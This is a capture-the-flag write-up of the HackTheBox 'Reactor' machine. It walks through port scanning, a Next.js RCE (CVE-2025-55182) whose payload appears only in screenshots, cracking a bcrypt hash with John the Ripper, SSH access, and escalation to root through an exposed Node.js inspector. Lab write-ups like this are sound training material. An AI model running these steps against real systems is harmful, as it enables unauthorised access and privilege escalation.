# 🔬 HackTheBox — Reactor

> **Difficulty:** Medium &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Category:** Web / Privilege Escalation  
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  - [Port Scanning](#port-scanning)
  - [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  - [CVE-2025-55182 — ReactorWatch RCE](#cve-2025-55182--reactorwatch-rce)
  - [Post-Exploitation — Database Extraction](#post-exploitation--database-extraction)
  - [Credential Cracking & SSH Access](#credential-cracking--ssh-access)
- [Privilege Escalation](#privilege-escalation)
  - [Process Enumeration](#process-enumeration)
  - [Node.js Inspector — Lateral to Root](#nodejs-inspector--lateral-to-root)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Reactor** is a HackTheBox machine themed around an industrial SCADA environment. The attack chain begins with identifying a vulnerable version of a SCADA web frontend called *ReactorWatch*, leveraging a known Next.js remote code execution vulnerability to gain an initial foothold. Post-exploitation involves extracting and cracking a password hash from a local database, then escalating to root by abusing an exposed Node.js inspector interface running with elevated privileges.

---

## Reconnaissance

### Port Scanning

An initial `nmap` scan revealed two open ports on the target:

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp (HTTP)
```

> **Key Finding:** Port `3000` was hosting a web application — a common alternative HTTP port often used by Node.js services.

<!-- 📸 IMAGE: nmap scan output -->
![nmap scan](./images/nmap-scan.png)

---

### Web Enumeration

Navigating to `http://<TARGET>:3000` presented a web frontend identifying itself as:

```
REACTORWATCH CORE MONITORING SYSTEM v3.2.1
```

The application appeared to be a front-end dashboard for a SCADA (Supervisory Control and Data Acquisition) system. The UI was largely *non-functional* — most controls and panels were static or non-interactive.

<!-- 📸 IMAGE: ReactorWatch web interface on port 3000 -->
![ReactorWatch web interface](./images/reactorwatch-homepage.png)

**Directory Bruteforcing with Gobuster:**

```bash
gobuster dir -u http://<TARGET>:3000 -w /usr/share/wordlists/dirb/common.txt
```

```
/cgi-bin   (Status: 403)
```

<!-- 📸 IMAGE: Gobuster scan output -->
![Gobuster output](./images/gobuster-scan.png)

Only a `/cgi-bin` directory was found, which returned a `403 Forbidden` — a dead end. Enumeration was deprioritised in favour of researching the versioned application.

---

## Exploitation

### CVE-2025-55182 — ReactorWatch RCE

With the version string `ReactorWatch Core Monitoring System v3.2.1` in hand, a targeted Google search revealed that this version is affected by **CVE-2025-55182** — a **Remote Code Execution** vulnerability stemming from an underlying **Next.js** flaw in the web application stack.

> **CVE:** `CVE-2025-55182`  
> **Impact:** Unauthenticated Remote Code Execution  
> **Affected Component:** Next.js runtime embedded in ReactorWatch v3.2.1

A **public Proof-of-Concept (PoC)** exploit was identified. The exploit was paired with **Burp Suite** to intercept and craft the malicious request, successfully achieving **RCE on the web server** and enabling arbitrary file reads from the underlying system.

<!-- 📸 IMAGE: Burp Suite request showing the exploit payload -->
![Burp Suite exploit request](./images/burpsuite-exploit.png)

<!-- 📸 IMAGE: RCE confirmed — command output on the server -->
![RCE confirmed](./images/rce-confirmed.png)

---

### Post-Exploitation — Database Extraction

With remote code execution established, local files were enumerated on the target. A SQLite database file was discovered:

```
/opt/reactor/reactor.db
```

Reading the database contents revealed a **password hash** for the `engineer` user:

```
engineer:$2y$10$<REDACTED_HASH>
```

<!-- 📸 IMAGE: reactor.db contents showing the engineer hash -->
![reactor.db hash](./images/reactor-db.png)

---

### Credential Cracking & SSH Access

The recovered hash was saved locally and cracked using **John the Ripper**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
engineer:<REDACTED_PASSWORD>   (1 hash cracked)
```

<!-- 📸 IMAGE: John the Ripper cracking the hash -->
![John cracking hash](./images/john-crack.png)

The cracked credentials were used to authenticate over SSH:

```bash
ssh engineer@<TARGET>
```

Access was confirmed as the `engineer` user. The **user flag** was located and retrieved.

```
$ cat /home/engineer/user.txt
HTB{REDACTED}
```

<!-- 📸 IMAGE: SSH login and user flag captured -->
![User flag](./images/user-flag.png)

---

## Privilege Escalation

### Process Enumeration

With a shell as `engineer`, the running process list was examined to identify any privilege escalation vectors:

```bash
ps -ef
```

The output revealed a **Node.js application running as `root`**:

```
root       1042      1  0 ...  node /opt/reactor/monitor.js --inspect=0.0.0.0:9229
```

<!-- 📸 IMAGE: ps -ef output highlighting the root Node.js process -->
![ps -ef process list](./images/ps-ef-output.png)

> **Key Observation:** The Node.js process was launched with the `--inspect` flag, exposing the **V8 Inspector Protocol** on **port `9229`**. This is a debugging interface that grants full programmatic access to the running process — including arbitrary code execution *in the context of that process's user*, which in this case is `root`.

---

### Node.js Inspector — Lateral to Root

The Node.js inspector was accessed using the built-in `node inspect` command:

```bash
node inspect 127.0.0.1:9229
```

Once a debugging session was established, the current process UID was verified:

```javascript
> process.getuid()
0
```

> **`getuid()` returning `0` confirms the process is executing as `root` (UID 0).**

<!-- 📸 IMAGE: Node.js inspector session — connecting to port 9229 -->
![Node inspector connection](./images/node-inspect-connect.png)

<!-- 📸 IMAGE: process.getuid() returning 0 confirming root -->
![getuid() = 0](./images/node-inspect-getuid.png)

With root-level code execution available via the inspector, the **root flag** was read directly from the filesystem.

```javascript
> require('fs').readFileSync('/root/root.txt', 'utf8')
'HTB{REDACTED}'
```

<!-- 📸 IMAGE: Root flag captured -->
![Root flag](./images/root-flag.png)

---

## Flags

| Flag | Value |
|------|-------|
| 🏳️ **User** | `HTB{REDACTED}` |
| 🚩 **Root** | `HTB{REDACTED}` |

---

## Summary

| Stage | Technique |
|-------|-----------|
| **Recon** | `nmap` port scan, `gobuster` directory enumeration, OSINT on version string |
| **Initial Access** | CVE-2025-55182 — Next.js RCE via PoC + Burp Suite |
| **Credential Access** | SQLite DB extraction → bcrypt hash cracking with `john` |
| **Lateral Movement** | SSH login as `engineer` |
| **Privilege Escalation** | Exposed Node.js `--inspect` port (9229) → root code execution |

---

*Writeup by Aryan Barkhordar*
